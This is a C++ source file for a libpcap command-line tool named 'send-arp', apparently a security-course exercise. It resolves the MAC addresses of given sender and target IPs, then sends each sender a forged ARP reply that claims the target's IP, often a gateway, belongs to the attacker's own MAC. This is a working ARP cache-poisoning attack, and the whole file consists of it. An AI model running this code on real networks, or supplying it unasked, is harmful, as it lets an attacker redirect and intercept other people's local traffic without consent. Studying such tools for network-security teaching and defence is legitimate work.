#include "send-arp.h"

void usage(char* argv[]) {
	printf("syntax: %s <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n", argv[0]);
	printf("sample: %s  wlan0 192.168.10.2 192.168.10.1\n", argv[0]);
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage(argv);
		return -1;
	}
    
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i = 0; i < (argc-2)/2; i++){
		Mac myMac = GetMyMac(std::string(dev));
		Ip myip = GetMyIp(std::string(dev));
		Mac sender_mac = GetMacfromIp(handle, Ip(argv[2 + 2*i]), myMac, myip);
		Mac target_mac = GetMacfromIp(handle, Ip(argv[3 + 2*i]), myMac, myip);

		std::cout << "[" << i << "] My ip Address :      " << std::string(myip) << "\n";
		std::cout << "[" << i << "] My Mac Address :     " << std::string(myMac) << "\n";
		std::cout << "[" << i << "] sender ip :          " << argv[2 + 2*i] << "\n";
		std::cout << "[" << i << "] sender Mac Address : " << std::string(sender_mac) << "\n";
		std::cout << "[" << i << "] target ip :          " << argv[3 + 2*i] << "\n";
		std::cout << "[" << i << "] target Mac Address : " << std::string(target_mac) << "\n";
		


		EthArpPacket packet;
		// eth : myMac -> sender_mac
		// arp mac : myMac -> sender_mac
		// arp ip : target -> sender_mac
		MakeEthPacket(&packet, false, std::string(myMac).c_str(), std::string(sender_mac).c_str()
						, std::string(myMac).c_str(), std::string(sender_mac).c_str(), argv[3 + 2*i], argv[2 + 2*i]);

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		
		std::cout << "[" << i <<"] DONE!" << "\n";
	}


	pcap_close(handle);

}
